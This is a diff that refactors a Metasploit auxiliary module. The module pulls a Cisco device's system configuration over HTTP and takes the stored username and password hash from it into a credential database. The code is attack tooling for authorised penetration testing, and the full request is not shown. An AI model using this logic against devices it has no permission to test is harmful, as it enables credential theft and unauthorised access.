@@ -5,7 +5,6 @@
 
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
-  include Msf::Auxiliary::Scanner
 
   def initialize(info = {})
     super(update_info(info,
@@ -31,7 +30,8 @@ class MetasploitModule < Msf::Auxiliary
         ],
       'Author'         =>
         [
-          'RedTeam Pentesting GmbH <release@redteam-pentesting.de>'
+          'RedTeam Pentesting GmbH <release@redteam-pentesting.de>',
+          'Aaron Soto <asoto@rapid7.com>'
         ],
       'License'      => MSF_LICENSE
     ))
@@ -67,10 +67,10 @@ class MetasploitModule < Msf::Auxiliary
       status: Metasploit::Model::Login::Status::UNTRIED
     }.merge(service_data)
 
-    cl = create_credential_login(login_data)
+    create_credential_login(login_data)
   end
 
-  def run_host(ip)
+  def run
     begin
       uri = normalize_uri(target_uri.path)
       res = send_request_cgi({
@@ -82,7 +82,12 @@ class MetasploitModule < Msf::Auxiliary
     if res.nil?
       print_error("#{rhost} - Failed! Got back an empty response.")
       print_error("Please validate the RHOST and TARGETURI options and try again.")
-    elsif res.code == 200
+      return
+    elsif res.code != 200
+      print_error("#{rhost} - Failed! Got back a #{res.code} HTTP response.")
+      print_error("Please validate the RHOST and TARGETURI options and try again.")
+      return
+    else
       body = res.body
       if body.match(/####sysconfig####/)
         # Report loot to database (and store on filesystem)
@@ -99,19 +104,13 @@ class MetasploitModule < Msf::Auxiliary
                     mac: mac,
                     name: hostname,
                     os_name: "Cisco",
-                    os_flavor: model
+                    os_flavor: model)
 
         # Report password hashes to database
         user = body.match(/^user (.*)/)[1]
         hash = body.match(/^password (.*)/)[1]
         report_cred(user, hash)
-      else
-        print_error("#{rhost} - Failed!  We got back something else.")
       end
-    else
-      print_error("#{rhost} - Failed! Got back a #{res.code} HTTP response.")
-      print_error("Please validate the RHOST and TARGETURI options and try again.")
     end
-
   end
 end
